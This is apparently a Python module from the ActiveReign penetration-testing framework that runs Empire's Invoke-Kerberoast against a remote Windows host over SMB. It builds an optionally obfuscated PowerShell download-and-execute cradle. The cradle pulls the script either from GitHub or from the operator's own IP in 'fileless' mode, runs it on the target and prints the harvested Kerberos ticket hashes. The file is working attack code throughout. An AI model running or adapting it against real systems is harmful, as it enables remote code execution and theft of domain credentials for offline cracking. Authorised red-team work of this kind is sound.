from ar3.helpers import powershell
from ar3.helpers.misc import get_local_ip
from ar3.ops.enum.host_enum import code_execution

class InvokeKerberoast():
    def __init__(self):
        self.name = 'Kerberoast'
        self.description = 'Use Empires invoke-kerberoasting module'
        self.author = ['@m8r0wn']
        self.credit = ['@EmpireProject']
        self.args = {}

    def run(self, target, args, smb_con, loggers, config_obj):
        logger = loggers['console']
        timeout = args.timeout
        loggers['console'].info([smb_con.host, smb_con.ip, self.name.upper(), 'Attempting Invoke-Kerberoast'])
        try:
            # Define Script Source
            if args.fileless:
                srv_addr = get_local_ip()
                script_location = 'http://{}/Invoke-Kerberoast.ps1'.format(srv_addr)
                setattr(args, 'timeout', timeout + 30)
            else:
                script_location = 'https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'
                setattr(args, 'timeout', timeout + 15)
            logger.debug('Script source: {}'.format(script_location))

            # Setup PS1 Script
            launcher = powershell.gen_ps_iex_cradle(script_location, '')

            # Execute
            cmd = powershell.create_ps_command(launcher, loggers['console'], force_ps32=args.force_ps32, no_obfs=args.no_obfs, server_os=smb_con.os)
            x = code_execution(smb_con, args, target, loggers, config_obj, cmd, return_data=True)

            # Display Output
            for line in x.splitlines():
                loggers['console'].success([smb_con.host, smb_con.ip, self.name.upper(), line])
        except Exception as e:
            logger.debug("{} Error: {}".format(self.name, str(e)))